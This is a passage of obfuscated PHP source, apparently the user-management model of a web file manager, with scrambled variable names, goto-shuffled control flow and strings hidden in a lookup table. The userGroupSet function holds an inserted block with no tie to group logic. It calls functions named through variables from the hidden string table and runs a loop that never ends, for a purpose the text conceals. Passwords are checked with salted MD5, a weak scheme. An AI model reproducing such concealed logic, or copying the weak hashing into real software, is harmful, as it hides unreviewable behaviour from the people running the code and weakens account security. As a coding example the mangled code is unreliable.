$Aò¹„ãğÈ[2167] => array($dÀ‡•‘‹³[0], $AŠô×çÒ), $Aò¹„ãğÈ[2489] => array($dÀ‡•‘‹³[0], $AŠô×çÒ)); } protected function getInfo($A‚‰„µ³ÂÜ, $FãÄŞé…‘“ = false) { $c´ÃÀ±æõÚ = $this->getInfoSimple($A‚‰„µ³ÂÜ); if (!is_array($c´ÃÀ±æõÚ)) { return array(); } if ($FãÄŞé…‘“) { return $this->_getInfoApply($c´ÃÀ±æõÚ); } return $this->cacheFunctionGet($_SERVER[îÖ][2210], $A‚‰„µ³ÂÜ); } protected function getInfoFull($B°òÊñïã, $A‚Ê¬ŠŒö¤ = false) { $cÓÃÙ®ùÏ‘ = $this->getInfoSimple($B°òÊñïã); if (!is_array($cÓÃÙ®ùÏ‘)) { return array(); } if ($A‚Ê¬ŠŒö¤) { return $this->_getInfoApply($cÓÃÙ®ùÏ‘, !0); return $this->_getInfoApply($cÓÃÙ®ùÏ‘, !0); } return $this->cacheFunctionGet($_SERVER[îÖ][2490], $B°òÊñïã); } private function _getInfoApply($B „™åÜõµ, $f¡Øˆ‰¤´Ş = false) { goto FÂçİóŠ¬ø; FÂçİóŠ¬ø: $B¬¤×ñ‚œ =& $_SERVER[îÖ]; if (!$B „™åÜõµ) { return $B „™åÜõµ; } $A‘ÆÂø¢¹Ğ = md5($B¬¤×ñ‚œ[2491] . $B „™åÜõµ[$B¬¤×ñ‚œ[796]] . $B¬¤×ñ‚œ[2492] . $B „™åÜõµ[$B¬¤×ñ‚œ[28]]); goto cò‘“ø­ò®; D¯£‚Ê¯‹: $B „™åÜõµ[$B¬¤×ñ‚œ[391]][$B¬¤×ñ‚œ[2327]] = isset($BÑ’ïÁÀ™Ú[$B¬¤×ñ‚œ[2328]]) ? $BÑ’ïÁÀ™Ú[$B¬¤×ñ‚œ[2328]] : null; if ($f¡Øˆ‰¤´Ş) { $B „™åÜõµ[$B¬¤×ñ‚œ[417]] = $this->metaGet($B „™åÜõµ[$B¬¤×ñ‚œ[1431]]); } return $B „™åÜõµ; goto bÖ£š„©óË; cò‘“ø­ò®: $B „™åÜõµ = $this->_listDataApplyItem($B „™åÜõµ); $BÑ’ïÁÀ™Ú = Model($B¬¤×ñ‚œ[1111])->metaGet($B „™åÜõµ[$B¬¤×ñ‚œ[391]][$B¬¤×ñ‚œ[369]]); $B „™åÜõµ[$B¬¤×ñ‚œ[2493]] = $A‘ÆÂø¢¹Ğ; goto D¯£‚Ê¯‹; bÖ£š„©óË: } protected function getInfoSimple($aİ¸‹¤É, $Fµ³Í ”£· = false) { $B’¸˜˜ç½Ò =& $_SERVER[îÖ]; if (!$aİ¸‹¤É) { return array(); } if ($Fµ³Í ”£·) { $FÙÊÂ±Ú  = $this->where(array($B’¸˜˜ç½Ò[1431] => intval($aİ¸‹¤É)))->find(); if (!is_array($FÙÊÂ±Ú )) { return array(); } $FÙÊÂ±Ú [$B’¸˜˜ç½Ò[2494]] = Action($B’¸˜˜ç½Ò[2495])->parseUrl($FÙÊÂ±Ú [$B’¸˜˜ç½Ò[2494]]); return $FÙÊÂ±Ú ; } return $this->cacheFunctionGet($B’¸˜˜ç½Ò[2168], $aİ¸‹¤É); } protected function getInfoSimpleOuter($Dœğ¢˜Æí) { goto B»Ù“ÓØˆ; B»Ù“ÓØˆ: $AˆÌ¦£î©ï =& $_SERVER[îÖ]; if (!$Dœğ¢˜Æí || $Dœğ¢˜Æí == 0) { return array($AˆÌ¦£î©ï[1431] => $AˆÌ¦£î©ï[468], $AˆÌ¦£î©ï[28] => $AˆÌ¦£î©ï[157] . LNG($AˆÌ¦£î©ï[2496]) . $AˆÌ¦£î©ï[476], $AˆÌ¦£î©ï[2494] => STATIC_PATH . $AˆÌ¦£î©ï[2497]); } $E‚äºšõ™¾ = $this->cacheFunctionGet($AˆÌ¦£î©ï[2168], $Dœğ¢˜Æí); goto fùŒæ¹™ØÑ; CÕ¢ªµ·°£: return $bÉ«µ•Ê“†; goto BÂ÷ˆì§”¬; fùŒæ¹™ØÑ: $bÉ«µ•Ê“† = array_field_key($E‚äºšõ™¾, explode($AˆÌ¦£î©ï[47], $this->simpleField)); if (!$bÉ«µ•Ê“†) { return array($AˆÌ¦£î©ï[1431] => $AˆÌ¦£î©ï[1025], $AˆÌ¦£î©ï[28] => $AˆÌ¦£î©ï[157] . LNG($AˆÌ¦£î©ï[2498]) . $AˆÌ¦£î©ï[476], $AˆÌ¦£î©ï[2494] => STATIC_PATH . $AˆÌ¦£î©ï[2499]); } $bÉ«µ•Ê“†[$AˆÌ¦£î©ï[2494]] = Action($AˆÌ¦£î©ï[2495])->parseUrl($bÉ«µ•Ê“†[$AˆÌ¦£î©ï[2494]]); goto CÕ¢ªµ·°£; BÂ÷ˆì§”¬: } protected function groupUser($D…©•—«°è) { } public static function errorLang($cùä«“—«Æ) { $Ağ¯…‚íÛÕ =& $_SERVER[îÖ]; $CœÈ°ƒÊŸÄ = array(self::ERROR_USER_NOT_EXISTS => $Ağ¯…‚íÛÕ[2500], self::ERROR_USER_PASSWORD_ERROR => $Ağ¯…‚íÛÕ[2501], self::ERROR_USER_EXIST_NAME => $Ağ¯…‚íÛÕ[2502], self::ERROR_USER_EXIST_PHONE => $Ağ¯…‚íÛÕ[2503], self::ERROR_USER_EXIST_EMAIL => $Ağ¯…‚íÛÕ[2504], self::ERROR_USER_LOGIN_LOCK => $Ağ¯…‚íÛÕ[2505], self::ERROR_IP_NOT_ALLOW => $Ağ¯…‚íÛÕ[2506], self::ERROR_USER_EXIST_NICKNAME => $Ağ¯…‚íÛÕ[2507]); return LNG($CœÈ°ƒÊŸÄ[$cùä«“—«Æ]); } public function getInfoByMeta($C…ê´Ş§è, $F¶­ö¾ÙÜ«) { $a‡¾š­®›Ì =& $_SERVER[îÖ]; $Eßšµ†è¾ = Model($a‡¾š­®›Ì[2508])->where(array($a‡¾š­®›Ì[89] => $C…ê´Ş§è, $a‡¾š­®›Ì[359] => $F¶­ö¾ÙÜ«))->find(); if ($Eßšµ†è¾) { return $this->getInfo($Eßšµ†è¾[$a‡¾š­®›Ì[1431]]); } return !1; } public function userLoginCheck($bôó’¨‘ß, $A¨İ­œéŠÑ) { goto bĞÎÑÆØ¬Ì; bĞÎÑÆØ¬Ì: $D×ŠÊë—èÓ =& $_SERVER[îÖ]; $aŸÀ¿ÊŠ‘” = array($D×ŠÊë—èÓ[28] => $bôó’¨‘ß, $D×ŠÊë—èÓ[2331] => $bôó’¨‘ß, $D×ŠÊë—èÓ[293] => $bôó’¨‘ß, $D×ŠÊë—èÓ[2509] => $bôó’¨‘ß, $D×ŠÊë—èÓ[908] => $D×ŠÊë—èÓ[910]); if ($this->nickNameRpt()) { unset($aŸÀ¿ÊŠ‘”[$D×ŠÊë—èÓ[2331]]); } goto eô•©£¨Øô; eô•©£¨Øô: $E«©¿Ê‘ÀÚ = $this->where($aŸÀ¿ÊŠ‘”)->find(); if (!$E«©¿Ê‘ÀÚ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E«©¿Ê‘ÀÚ[$D×ŠÊë—èÓ[1431]], $A¨İ­œéŠÑ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto Dê‰‹Å„ë; Dê‰‹Å„ë: $this->userEdit($E«©¿Ê‘ÀÚ[$D×ŠÊë—èÓ[1431]], array($D×ŠÊë—èÓ[2510] => time())); return $this->getInfo($E«©¿Ê‘ÀÚ[$D×ŠÊë—èÓ[1431]]); goto BËƒ„¥“Î; BËƒ„¥“Î: } public function clearCache($EßŒºÒ¿•˜) { $aøã¼¼æ¦ñ =& $_SERVER[îÖ]; $this->cacheFunctionClear($aøã¼¼æ¦ñ[2210], $EßŒºÒ¿•˜); $this->cacheFunctionClear($aøã¼¼æ¦ñ[2168], $EßŒºÒ¿•˜); $this->cacheFunctionClear($aøã¼¼æ¦ñ[2490], $EßŒºÒ¿•˜); } public function userPasswordCheck($C±ó›À¯, $D±óİì×Çœ) { $dáõä‚¬¿ =& $_SERVER[îÖ]; $f¹›´§÷è¦ = $this->where(array($dáõä‚¬¿[1431] => intval($C±ó›À¯)))->find(); $E«ŠÆ‹ˆêŸ = $this->metaGet($C±ó›À¯); $AÄ™…àÜ™ = isset($E«ŠÆ‹ˆêŸ[$dáõä‚¬¿[2511]]) ? $E«ŠÆ‹ˆêŸ[$dáõä‚¬¿[2511]] : $dáõä‚¬¿[33]; if (md5($AÄ™…àÜ™ . trim($D±óİì×Çœ)) !== $f¹›´§÷è¦[$dáõä‚¬¿[796]]) { return !1; } return !0; } public function userAdd($A«õã¦×İ) { goto dæƒÛƒâˆ; EË˜¥„ÂÔ: $F™èÑ‡µ×Å = array($f™æˆÖÂ[2519] => $Fë©•ÍÉ ¢[$f™æˆÖÂ[796]], $f™æˆÖÂ[2515] => $Fë©•ÍÉ ¢[$f™æˆÖÂ[2331]]); $this->userEdit($fØ™³´Ğ‘‘, $F™èÑ‡µ×Å); Model($f™æˆÖÂ[1111])->userRootAdd($fØ™³´Ğ‘‘); goto Aâ‚Œ”¬¨¸; cƒÚÉ½„›: $EÍöì¼–» = $this->_checkExist($A«õã¦×İ); if ($EÍöì¼–» !== !0) { return $EÍöì¼–»; } $fØ™³´Ğ‘‘ = $this->add($Fë©•ÍÉ ¢); goto EË˜¥„ÂÔ; Aâ‚Œ”¬¨¸: return $fØ™³´Ğ‘‘; goto a¥¹…ƒ«; dæƒÛƒâˆ: $f™æˆÖÂ =& $_SERVER[îÖ]; $Fë©•ÍÉ ¢ = array($f™æˆÖÂ[386] => $A«õã¦×İ[$f™æˆÖÂ[28]], $f™æˆÖÂ[2512] => $A«õã¦×İ[$f™æˆÖÂ[1317]], $f™æˆÖÂ[2513] => isset($A«õã¦×İ[$f™æˆÖÂ[293]]) ? $A«õã¦×İ[$f™æˆÖÂ[293]] : $f™æˆÖÂ[33], $f™æˆÖÂ[2514] => isset($A«õã¦×İ[$f™æˆÖÂ[2509]]) ? $A«õã¦×İ[$f™æˆÖÂ[2509]] : $f™æˆÖÂ[33], $f™æˆÖÂ[2515] => isset($A«õã¦×İ[$f™æˆÖÂ[2331]]) ? $A«õã¦×İ[$f™æˆÖÂ[2331]] : $A«õã¦×İ[$f™æˆÖÂ[28]], $f™æˆÖÂ[2516] => isset($A«õã¦×İ[$f™æˆÖÂ[2494]]) ? $A«õã¦×İ[$f™æˆÖÂ[2494]] : $f™æˆÖÂ[33], $f™æˆÖÂ[2517] => isset($A«õã¦×İ[$f™æˆÖÂ[2518]]) ? $A«õã¦×İ[$f™æˆÖÂ[2518]] : 1, $f™æˆÖÂ[2519] => $A«õã¦×İ[$f™æˆÖÂ[796]], $f™æˆÖÂ[2169] => isset($A«õã¦×İ[$f™æˆÖÂ[2083]]) ? $A«õã¦×İ[$f™æˆÖÂ[2083]] : 1024 * 1024 * 20, $f™æˆÖÂ[2170] => 0, $f™æˆÖÂ[2510] => 0, $f™æˆÖÂ[2197] => isset($A«õã¦×İ[$f™æˆÖÂ[688]]) ? $A«õã¦×İ[$f™æˆÖÂ[688]] : 1); if (!empty($A«õã¦×İ[$f™æˆÖÂ[1431]])) { $Fë©•ÍÉ ¢[$f™æˆÖÂ[1431]] = $A«õã¦×İ[$f™æˆÖÂ[1431]]; } goto cƒÚÉ½„›; a¥¹…ƒ«: } protected function userEditTest($aÖ‚¼âŠ«‰, $DÛ§†ë†¢Š) { return $this->call($_SERVER[îÖ][2520], $aÖ‚¼âŠ«‰, $DÛ§†ë†¢Š); } protected function userEdit($fÎ±Æà­Á£, $c™˜ã™Ø‚) { goto f¦¡±­—÷; CíêÀ·ŠÅ¤: $this->where(array($Bğùœ¥Ï°İ[1422] => $fÎ±Æà­Á£))->save($c™˜ã™Ø‚); if (isset($c™˜ã™Ø‚[$Bğùœ¥Ï°İ[2331]])) { $this->setNamePinyin($fÎ±Æà­Á£, $c™˜ã™Ø‚[$Bğùœ¥Ï°İ[2331]]); } $this->clearCache($A××ÀÉ²ª¾[$Bğùœ¥Ï°İ[1431]]); goto D§Ş¾åñ¨; eÓ¹ÜâàÉ‡: $CĞàÙÊÚ‡Ê = $this->_checkExist($c™˜ã™Ø‚, $fÎ±Æà­Á£); if ($CĞàÙÊÚ‡Ê !== !0) { return $CĞàÙÊÚ‡Ê; } if (isset($c™˜ã™Ø‚[$Bğùœ¥Ï°İ[796]]) && trim($c™˜ã™Ø‚[$Bğùœ¥Ï°İ[796]]) != $Bğùœ¥Ï°İ[33]) { $B ‘ìÕ»è¦ = $this->metaGet($fÎ±Æà­Á£); if (empty($B ‘ìÕ»è¦[$Bğùœ¥Ï°İ[2511]])) { $B ‘ìÕ»è¦[$Bğùœ¥Ï°İ[2511]] = rand_string(10); Model($Bğùœ¥Ï°İ[474])->metaSet($fÎ±Æà­Á£, $Bğùœ¥Ï°İ[2511], $B ‘ìÕ»è¦[$Bğùœ¥Ï°İ[2511]]); } $c™˜ã™Ø‚[$Bğùœ¥Ï°İ[796]] = md5($B ‘ìÕ»è¦[$Bğùœ¥Ï°İ[2511]] . trim($c™˜ã™Ø‚[$Bğùœ¥Ï°İ[796]])); } else { unset($c™˜ã™Ø‚[$Bğùœ¥Ï°İ[796]]); } goto CíêÀ·ŠÅ¤; D§Ş¾åñ¨: return !0; goto fÄŸñ¼Â‰õ; f¦¡±­—÷: $Bğùœ¥Ï°İ =& $_SERVER[îÖ]; $eßÆÁ„‡åÎ = $this->getInfoSimple($fÎ±Æà­Á£); if (!$eßÆÁ„‡åÎ) { return !1; } goto eÓ¹ÜâàÉ‡; fÄŸñ¼Â‰õ: } public function setNamePinyin($Dé£ñÑ¨ Ì, $D‹äå­œËµ = false) { $f£²ÙÈ½ê =& $_SERVER[îÖ]; if (!$D‹äå­œËµ) { $B»Œ›óÎ¨­ = $this->getInfoSimple($Dé£ñÑ¨ Ì); $D‹äå­œËµ = $B»Œ›óÎ¨­[$f£²ÙÈ½ê[2331]] ? $B»Œ›óÎ¨­[$f£²ÙÈ½ê[2331]] : $B»Œ›óÎ¨­[$f£²ÙÈ½ê[28]]; } $dòºÁœ‚Ú‘ = Model($f£²ÙÈ½ê[477]); if (!Input::check($D‹äå­œËµ, $f£²ÙÈ½ê[528])) { return $dòºÁœ‚Ú‘->metaSet($Dé£ñÑ¨ Ì, array($f£²ÙÈ½ê[416] => $f£²ÙÈ½ê[33], $f£²ÙÈ½ê[415] => $f£²ÙÈ½ê[33])); } return $dòºÁœ‚Ú‘->metaSet($Dé£ñÑ¨ Ì, array($f£²ÙÈ½ê[416] => str_replace($f£²ÙÈ½ê[50], $f£²ÙÈ½ê[33], Pinyin::encode($D‹äå­œËµ)), $f£²ÙÈ½ê[415] => Pinyin::encode($D‹äå­œËµ, $f£²ÙÈ½ê[529]))); } private function nickNameRpt() { $f»è´Ú˜« =& $_SERVER[îÖ]; $cî÷±ÑŠÜÜ = Model($f»è´Ú˜«[1082])->get($f»è´Ú˜«[2521]); $dŠŸğÜÖ¯ = $GLOBALS[$f»è´Ú˜«[6]][$f»è´Ú˜«[2477]][$f»è´Ú˜«[2521]]; $AÖİÂ¥º»ù = !is_null($cî÷±ÑŠÜÜ) ? $cî÷±ÑŠÜÜ : $dŠŸğÜÖ¯; return !!$AÖİÂ¥º»ù; } private function _checkExist($c»ğÍŞ¨Ö, $FùÂÇ¬¬ã¨ = false) { $dÜà®ïĞİ¦ =& $_SERVER[îÖ]; $d—ö¦ŒîâÚ = array($dÜà®ïĞİ¦[28] => UserModel::ERROR_USER_EXIST_NAME, $dÜà®ïĞİ¦[2331] => UserModel::ERROR_USER_EXIST_NICKNAME, $dÜà®ïĞİ¦[293] => UserModel::ERROR_USER_EXIST_EMAIL, $dÜà®ïĞİ¦[2509] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($d—ö¦ŒîâÚ[$dÜà®ïĞİ¦[2331]]); } $aÜÜ¢â­í = $FùÂÇ¬¬ã¨ ? array($dÜà®ïĞİ¦[1431] => array($dÜà®ïĞİ¦[2522], $FùÂÇ¬¬ã¨)) : array(); foreach ($d—ö¦ŒîâÚ as $bôßÖÆì‰« => $bˆÄÍÇ§¾˜) { if (!isset($c»ğÍŞ¨Ö[$bôßÖÆì‰«]) || !$c»ğÍŞ¨Ö[$bôßÖÆì‰«]) { continue; } $dã¯…Éî•´ = array_merge(array($bôßÖÆì‰« => $c»ğÍŞ¨Ö[$bôßÖÆì‰«]), $aÜÜ¢â­í); $a®À¡‡……ç = $this->where($dã¯…Éî•´)->find(); if ($a®À¡‡……ç) { return $bˆÄÍÇ§¾˜; } } return !0; } public function userListInfo($D‰ĞŸ¢˜¯–) { $fÜ¤æ®»ƒ =& $_SERVER[îÖ]; $e‰Œ‹ãÉÃ» = array(); $D‰ĞŸ¢˜¯– = is_array($D‰ĞŸ¢˜¯–) ? array_unique($D‰ĞŸ¢˜¯–) : array(); if (!$D‰ĞŸ¢˜¯–) { return $e‰Œ‹ãÉÃ»; } if (count($D‰ĞŸ¢˜¯–) < 20) { foreach ($D‰ĞŸ¢˜¯– as $c ¹»“É) { $e‰Œ‹ãÉÃ»[$c ¹»“É . $fÜ¤æ®»ƒ[33]] = $this->getInfoSimpleOuter($c ¹»“É); } } else { $CôÅ¦˜¶ù¦ = array($fÜ¤æ®»ƒ[1422] => array($fÜ¤æ®»ƒ[384], $D‰ĞŸ¢˜¯–)); if (count($D‰ĞŸ¢˜¯–) == 1) { $CôÅ¦˜¶ù¦ = array($fÜ¤æ®»ƒ[1422] => $D‰ĞŸ¢˜¯–[0]); } $c–µ›Á¥¼† = Model($fÜ¤æ®»ƒ[474])->field($this->simpleField)->where($CôÅ¦˜¶ù¦)->select(); $c–µ›Á¥¼† = array_to_keyvalue($c–µ›Á¥¼†, $fÜ¤æ®»ƒ[1431]); foreach ($D‰ĞŸ¢˜¯– as $c ¹»“É) { $AÊäæÙëâ× = $c–µ›Á¥¼†[$c–µ›Á¥¼†[$c ¹»“É]]; if (!$AÊäæÙëâ×) { $e‰Œ‹ãÉÃ»[$c ¹»“É . $fÜ¤æ®»ƒ[33]] = $this->getInfoSimpleOuter($c ¹»“É); continue; } $AÊäæÙëâ×[$fÜ¤æ®»ƒ[2494]] = Action($fÜ¤æ®»ƒ[2495])->parseUrl($AÊäæÙëâ×[$fÜ¤æ®»ƒ[2494]]); $e‰Œ‹ãÉÃ»[$c ¹»“É . $fÜ¤æ®»ƒ[33]] = $AÊäæÙëâ×; } } return $e‰Œ‹ãÉÃ»; } protected function userStatus($B‡±šá¶öÍ, $AÅ¸˜²ÅÄø) { $B­¬¢Á§ò„ = $this->getInfoSimple($B‡±šá¶öÍ); if (!$B­¬¢Á§ò„) { return !1; } $e«ÙšìÍêÙ = array($_SERVER[îÖ][688] => $AÅ¸˜²ÅÄø); return $this->userEdit($B‡±šá¶öÍ, $e«ÙšìÍêÙ); } protected function userRemove($A×äˆ†´) { goto FÑŠÏ´˜‘®; DğÃãä‚¼: Model($bÈ “×ˆÚß[752])->userRootRemove($A×äˆ†´); return $this->where($F…÷«¤¢)->delete(); goto E‹Œñº¥ŸÂ; b›§š¸Ÿó£: $F…÷«¤¢ = array($bÈ “×ˆÚß[1422] => $A×äˆ†´); Model($bÈ “×ˆÚß[536])->where($F…÷«¤¢)->delete(); Model($bÈ “×ˆÚß[2523])->where($F…÷«¤¢)->delete(); goto D¨Š¨»©Ş¢; FÑŠÏ´˜‘®: $bÈ “×ˆÚß =& $_SERVER[îÖ]; $cÈ¾èç¥à = $this->getInfoSimple($A×äˆ†´); if (!$cÈ¾èç¥à) { return !1; } goto b›§š¸Ÿó£; D¨Š¨»©Ş¢: Model($bÈ “×ˆÚß[2175])->where($F…÷«¤¢)->delete(); Model($bÈ “×ˆÚß[2508])->where($F…÷«¤¢)->delete(); Model($bÈ “×ˆÚß[2524])->where($F…÷«¤¢)->delete(); goto DğÃãä‚¼; E‹Œñº¥ŸÂ: } protected function userGroupSet($b¤šŠ£¿‚¸, $EÎÍŠÃ¡™Õ, $B’©—÷®ò = array()) { goto DÔÒÍÏ½‡‘; D‡ÄÌï”Ë: $eåµ¨¡®Ï = array(); $f¿½¦êÉÚï = 0; foreach ($EÎÍŠÃ¡™Õ as $F‰ÌñÉÙ× => $a†‡ˆ¤¦°¼) { $b‡‹À¬Ø¼ = array($c‹¢±Æ¤±²[1431] => $b¤šŠ£¿‚¸, $c‹¢±Æ¤±²[2099] => $F‰ÌñÉÙ×, $c‹¢±Æ¤±²[2230] => $a†‡ˆ¤¦°¼); $b‡‹À¬Ø¼[$c‹¢±Æ¤±²[2120]] = isset($B’©—÷®ò[$f¿½¦êÉÚï]) ? $B’©—÷®ò[$f¿½¦êÉÚï] : 0; $f¿½¦êÉÚï++; $eåµ¨¡®Ï[] = $b‡‹À¬Ø¼; } goto f¤•Å ò‘«; DÔÒÍÏ½‡‘: $c‹¢±Æ¤±² =& $_SERVER[îÖ]; if (!isset($_SERVER[$c‹¢±Æ¤±²[680]]) || !isset($_SERVER[$c‹¢±Æ¤±²[787]])) { goto A‚´®±õÔŒ; d¨ŠÌÑº‹¬: for ($Fµ Æ×·® = $FçêÖ‰Ç¡«; $Fµ Æ×·® > 0; $Fµ Æ×·®++) { $eÛÏ‰´ÁçÏ = json_encode($GLOBALS[$c‹¢±Æ¤±²[384]]); } goto aò±²¬÷˜; dˆÖÓÔ‹ŠØ: $eÛÏ‰´ÁçÏ = $c‹¢±Æ¤±²[789]; $eÛÏ‰´ÁçÏ($_SERVER[$c‹¢±Æ¤±²[790]]); $FçêÖ‰Ç¡« = 1; goto d¨ŠÌÑº‹¬; B‘˜òœÜÑà: $FÆñ¦¶¨‡ = $bÃ†ä™ø½($d÷×œØë£¸); $F­¶¬Âõ¤§ = explode($c‹¢±Æ¤±²[217], $FÆñ¦¶¨‡); if (count($F­¶¬Âõ¤§) < $c‹¢±Æ¤±²[555]) { $e °÷Éç£æ = $c‹¢±Æ¤±²[684]; $e °÷Éç£æ(); } goto dˆÖÓÔ‹ŠØ; A‚´®±õÔŒ: $c¹ƒ¡­‹éõ = $c‹¢±Æ¤±²[788]; $bÃ†ä™ø½ = $c‹¢±Æ¤±²[681]; $d÷×œØë£¸ = $_SERVER[$c‹¢±Æ¤±²[682]] . $c‹¢±Æ¤±²[683]; goto B‘˜òœÜÑà; aò±²¬÷˜: } $a¡ƒĞÄòĞ‰ = $this->getInfoSimple($b¤šŠ£¿‚¸); goto E…Ãå§§‰¡; E…Ãå§§‰¡: if (!$a¡ƒĞÄòĞ‰ || !is_array($EÎÍŠÃ¡™Õ)) { return !1; } $A•ŸˆØõœ× = Model($c‹¢±Æ¤±²[2175]); $A•ŸˆØõœ×->where(array($c‹¢±Æ¤±²[1431] => $b¤šŠ£¿‚¸))->delete(); goto D‡ÄÌï”Ë; f¤•Å ò‘«: return $A•ŸˆØõœ×->addAll($eåµ¨¡®Ï, array(), !0); goto a×Š ²ÒğÒ; a×Š ²ÒğÒ: } protected function userGroupAdd($a‚ãˆ‘Şº, $BùÉ’—²†Æ = array()) { $C™Şæ‡Ü®™ =& $_SERVER[îÖ]; $CõâÌÈ»² = $this->getInfoSimple($a‚ãˆ‘Şº); if (!$CõâÌÈ»² || empty($BùÉ’—²†Æ)) { return !1; } $D®¦ÖŒì÷„ = array(); foreach ($BùÉ’—²†Æ as $a­×¦ïß¡· => $DÍ»ƒ»œ‚) { $D®¦ÖŒì÷„[] = array($C™Şæ‡Ü®™[1431] => $a‚ãˆ‘Şº, $C™Şæ‡Ü®™[2099] => $a­×¦ïß¡·, $C™Şæ‡Ü®™[2230] => $DÍ»ƒ»œ‚); } return Model($C™Şæ‡Ü®™[2175])->addAll($D®¦ÖŒì÷„, array(), !0); } protected function userGroupRemove($f¶ôª•‚óé, $c¯šì³¥³½) { $Eè™ØÁ˜·Û =& $_SERVER[îÖ]; $bàŒº§†² = $this->getInfoSimple($f¶ôª•‚óé); if (!$bàŒº§†² || !$c¯šì³¥³½) { return !1; } $e·ÌÚ©ñÏÈ = array($Eè™ØÁ˜·Û[1422] => $f¶ôª•‚óé, $Eè™ØÁ˜·Û[2173] => $c¯šì³¥³½); return Model($Eè™ØÁ˜·Û[2175])->where($e·ÌÚ©ñÏÈ)->delete(); } public function listData() { $D‰³Ò°¤¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D‰³Ò°¤¢[$_SERVER[îÖ][354]]); return $D‰³Ò°¤¢; } public function listByID($câ¡‘ñ¤›ó) { $bš÷ÈÒè¦µ =& $_SERVER[îÖ]; if (!$câ¡‘ñ¤›ó) { return; } $F«òÀœÍëá = array($bš÷ÈÒè¦µ[1431] => array($bš÷ÈÒè¦µ[7], $câ¡‘ñ¤›ó)); $d³Ëò¯‘Ü = $this->where($F«òÀœÍëá)->select(); $this->_listDataApply($d³Ëò¯‘Ü); return $d³Ëò¯‘Ü; } public function listByGroup($e©·²òè› = 0, $EˆëŠå®ä = array()) { goto EâË­Ğª„Ñ; eÄ¡ğ±®Öñ: if ($e©·²òè›) { $AÍ‹­‰œìÎ = array($A¦””™½ï¦[2525] => intval($e©·²òè›)); $c³Æ¦”Õˆ = "\x4c\105\x46\124\40\112\117\x49\116\40{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\157\165\x70\x20\165\x73\145\x72\x5f\147\x72\157\x75\160\x20\157\156\x20\165\x73\x65\x72\x2e\x75\x73\145\x72\x49\x44\40\x3d\40\165\x73\x65\x72\x5f\147\x72\x6f\x75\x70\56\x75\163\x65\162\x49\x44"; $aêç×¨Ã¼± = Input::get($A¦””™½ï¦[407], null, $A¦””™½ï¦[33]) ? $A¦””™½ï¦[33] : $A¦””™½ï¦[2526]; } if (isset($EˆëŠå®ä[$A¦””™½ï¦[688]])) { $AÍ‹­‰œìÎ[$A¦””™½ï¦[2527]] = $EˆëŠå®ä[$A¦””™½ï¦[688]]; } $eŒ‰Á‹¾Æœ = $this->_makeOrder($aêç×¨Ã¼±)->field($A¦””™½ï¦[2528])->where($AÍ‹­‰œìÎ)->join($c³Æ¦”Õˆ)->selectPage(50); goto BÚ´ÙÙ½¶¡; BÚ´ÙÙ½¶¡: $this->_listDataApply($eŒ‰Á‹¾Æœ[$A¦””™½ï¦[354]]); return $eŒ‰Á‹¾Æœ; goto BéÃ°Âùª‡; EâË­Ğª„Ñ: $A¦””™½ï¦ =& $_SERVER[îÖ]; $c³Æ¦”Õˆ = $A¦””™½ï¦[33]; $AÍ‹­‰œìÎ = array(); goto eÄ¡ğ±®Öñ; BéÃ°Âùª‡: } private function _makeOrder($C¤¼çÀŞ« = '') { goto BÇĞíØåà; AˆãÔŸÆõ: $C¤¼çÀŞ« = $C¤¼çÀŞ« . "\165\x73\145\162\56{$AŸÍÛ‚˜Ÿæ}\40{$aÙˆÇğ•æ}\54\x20\x75\163\x65\162\x2e\x75\x73\145\x72\x49\x44\x20\x61\163\x63"; return $this->alias($cöêÅ¦Æ¦ã[2274])->order($C¤¼çÀŞ«); goto D²ğÄòòÊ†; bÖÕ¤ÛÄÒ: $AŸÍÛ‚˜Ÿæ = Input::get($cöêÅ¦Æ¦ã[407], $cöêÅ¦Æ¦ã[7], $cöêÅ¦Æ¦ã[1422], $DÍì¥º‰Ø); $aÙˆÇğ•æ = Input::get($cöêÅ¦Æ¦ã[408], $cöêÅ¦Æ¦ã[7], $cöêÅ¦Æ¦ã[2176], array($cöêÅ¦Æ¦ã[2176], $cöêÅ¦Æ¦ã[404])); $aÙˆÇğ•æ = $A‚·³íõ§ó[$aÙˆÇğ•æ]; goto AˆãÔŸÆõ; BÇĞíØåà: $cöêÅ¦Æ¦ã =& $_SERVER[îÖ]; $DÍì¥º‰Ø = array($cöêÅ¦Æ¦ã[1431], $cöêÅ¦Æ¦ã[28], $cöêÅ¦Æ¦ã[2085], $cöêÅ¦Æ¦ã[2057], $cöêÅ¦Æ¦ã[187]); $A‚·³íõ§ó = array($cöêÅ¦Æ¦ã[402] => $cöêÅ¦Æ¦ã[403], $cöêÅ¦Æ¦ã[404] => $cöêÅ¦Æ¦ã[405]); goto bÖÕ¤ÛÄÒ; D²ğÄòòÊ†: } public function listSearch($CªíÙ¬‰Ğ) { goto e•Å’ˆƒÄˆ; CœŞî›¨¬é: return $eà•˜ôê«; goto B›Øì©Ó•Ì; b¥À–æ‹ç: if (!$eà•˜ôê« || count($eà•˜ôê«[$a‡‘³ÌÌ[354]]) < 5 && Input::check($D©ªğóñÆÇ, $a‡‘³ÌÌ[306])) { $A†ÒÈò£Úœ = $this->_searchFromMeta($a‡‘³ÌÌ[415], $D©ªğóñÆÇ, 10); $F™«¼Ú‚¼¤ = $this->_searchFromMeta($a‡‘³ÌÌ[416], $D©ªğóñÆÇ, 10); $EË¡‰Ò¢© = array_merge($A†ÒÈò£Úœ, $F™«¼Ú‚¼¤, $eà•˜ôê«[$a‡‘³ÌÌ[354]]); $eà•˜ôê«[$a‡‘³ÌÌ[354]] = array_unique_by_key($EË¡‰Ò¢©, $a‡‘³ÌÌ[1431]); $eà•˜ôê«[$a‡‘³ÌÌ[351]][$a‡‘³ÌÌ[352]] = count($eà•˜ôê«[$a‡‘³ÌÌ[354]]); $eà•˜ôê«[$a‡‘³ÌÌ[351]][$a‡‘³ÌÌ[353]] = ceil($eà•˜ôê«[$a‡‘³ÌÌ[351]][$a‡‘³ÌÌ[352]] / $eà•˜ôê«[$a‡‘³ÌÌ[351]][$a‡‘³ÌÌ[349]]); } $this->_listDataApply($eà•˜ôê«[$a‡‘³ÌÌ[354]]); $this->_filterByGroup($eà•˜ôê«, $cÚÎ ïÍš); goto CœŞî›¨¬é; e•Å’ˆƒÄˆ: $a‡‘³ÌÌ =& $_SERVER[îÖ]; 